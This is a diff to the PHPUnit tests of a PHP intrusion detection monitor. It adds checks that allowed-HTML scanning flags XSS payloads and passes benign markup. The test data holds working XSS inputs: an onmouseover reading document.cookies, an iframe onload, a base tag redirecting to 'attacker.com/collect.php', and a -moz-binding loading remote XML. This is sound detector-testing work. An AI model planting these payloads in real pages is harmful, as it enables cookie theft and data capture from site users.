@@ -467,7 +467,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(481, $result->getImpact());
+        $this->assertEquals(474, $result->getImpact());
     }
 
     public function testSelfContainedXSSList() {
@@ -1001,7 +1001,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(69, $result->getImpact());
+        $this->assertEquals(62, $result->getImpact());
     }
 
     public function testHexCCConverter() {
@@ -1055,6 +1055,69 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $this->assertEquals(27, $result->getImpact());
     }
 
+    public function testAllowedHTMLScanningPositive() {
+
+    	$exploits = array();
+        $exploits['html_1'] = '<a/onmouseover=alert(document.cookies) href="http://www.google.de/">Google</a>';
+        $exploits['html_2'] = '<table width="500"><tr><th>Test</th><iframe/onload=alert(1)> </tr><tr><td>test</td></tr></table>';
+        $exploits['html_3'] = '<table>
+						     <tr>
+						     <td class="TableRowAlt">
+						     <img src="templates/default/images/carat.gif" border="0" width="8" height="8" alt="" style="vertical-align: middle;" />&nbsp;                                <a href="http://sla.ckers.org/forum/read.php?13,22665">FEEDBACK on my thesis on Session Management: SESSION FIXATION</a>
+						     </td>
+						     <td class="TableRowAlt" align="center">81&nbsp;</td>
+						     <td class="TableRowAlt" align="center" nowrap="nowrap">1&nbsp;</td>
+						     <td class="TableRowAlt" nowrap="nowrap"><a href="http://sla.ckers.org/forum/">euronymous</a></td>
+						     <td class="TableRowAlt SmallFont" nowrap="nowrap">
+						     06/01/2008 04:05AM<br />
+						     <span class="ListSubText">
+						     <a href="http://sla.ckers.org/forum/read.php?13,22665,22665#msg-22665">Last Post</a> by <a href="http://sla.ckers.org/forum/profile.php?13,1410">euronymous</a>        </span>
+						     </td>
+						     </tr>
+						      </table><base href="http://attacker.com/collect.php" />';
+        $exploits['html_4'] = '<div style="-moz-binding:url(http://h4k.in/mozxss.xml#xss)">hello!</div>';
+        
+        $test = new IDS_Monitor(
+            $exploits,
+            $this->init
+        );
+        $test->setHtml(array('html_1', 'html_2', 'html_3'), 'html_4');
+        $result = $test->run();
+        $this->assertFalse($result->hasEvent(1));
+        $this->assertEquals(90, $result->getImpact());  	
+    }
+    
+    public function testAllowedHTMLScanningNegative() {
+
+        $exploits = array();
+        $exploits['html_1'] = '<a href="http://www.google.de/">Google</a>';
+        $exploits['html_2'] = '<table width="500"><tr><th>Test</th></tr><tr><td>test</td></tr></table>';
+        $exploits['html_3'] = '<table>
+                             <tr>
+                             <td class="TableRowAlt">
+                             <img src="templates/default/images/carat.gif" border="0" width="8" height="8" alt="" style="vertical-align: middle;" />&nbsp;                                <a href="http://sla.ckers.org/forum/read.php?13,22665">FEEDBACK on my thesis on Session Management: SESSION FIXATION</a>
+                             </td>
+                             <td class="TableRowAlt" align="center">81&nbsp;</td>
+                             <td class="TableRowAlt" align="center" nowrap="nowrap">1&nbsp;</td>
+                             <td class="TableRowAlt" nowrap="nowrap"><a href="http://sla.ckers.org/forum/profile.php?13,1410">euronymous</a></td>
+                             <td class="TableRowAlt SmallFont" nowrap="nowrap">
+                             06/01/2008 04:05AM&nbsp;<br />
+                             <span class="ListSubText">
+                             <a href="http://sla.ckers.org/forum/read.php?13,22665,22665#msg-22665">Last Post</a> by <a href="http://sla.ckers.org/forum/profile.php?13,1410">euronymous</a>        </span>
+                             </td>
+                             </tr>
+                             </table>';
+        
+        $test = new IDS_Monitor(
+            $exploits,
+            $this->init
+        );
+        $test->setHtml(array('html_1', 'html_2', 'html_3'));
+        $result = $test->run();
+        $this->assertFalse($result->hasEvent(1));
+        $this->assertEquals(0, $result->getImpact());   
+    }    
+    
     public function testForFalseAlerts() {
 
         $exploits = array();
